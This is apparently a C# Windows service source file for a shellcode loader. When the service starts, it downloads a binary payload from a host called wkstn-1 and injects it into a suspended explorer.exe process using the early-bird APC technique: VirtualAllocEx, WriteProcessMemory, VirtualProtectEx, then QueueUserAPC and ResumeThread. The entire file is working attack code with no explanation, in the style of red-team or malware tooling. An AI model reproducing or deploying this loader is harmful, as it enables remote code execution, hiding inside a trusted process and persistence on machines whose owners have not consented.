using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using static loaderservice.Imports.Imports;


namespace loaderservice
{
    public partial class Service : ServiceBase
    {
        public Service()
        {
            InitializeComponent();
        }
        public static async void attack()
        {
            byte[] buf;
            using (var client = new HttpClient())
            {
                client.BaseAddress = new Uri("http://wkstn-1:8080");
                buf = await client.GetByteArrayAsync("/smb.bin");
            }
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            string app = @"C:\Windows\explorer.exe";
            bool procinit = CreateProcess(null, app, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED, IntPtr.Zero, null, ref si, ref pi);
            IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            IntPtr bytesWritten = IntPtr.Zero;
            bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, buf, buf.Length, ref bytesWritten);

            uint oldProtect = 0;
            IntPtr proc_handle = pi.hProcess;
            resultBool = VirtualProtectEx(proc_handle, resultPtr, buf.Length, PAGE_EXECUTE_READ, out oldProtect);

            IntPtr ptr = QueueUserAPC(resultPtr, pi.hThread, IntPtr.Zero);

            IntPtr ThreadHandle = pi.hThread;
            ResumeThread(ThreadHandle);
        }

        protected override async void OnStart(string[] args)
        {
            attack();
        }

        protected override void OnStop()
        {
            Console.Write("hello");
        }
    }
}
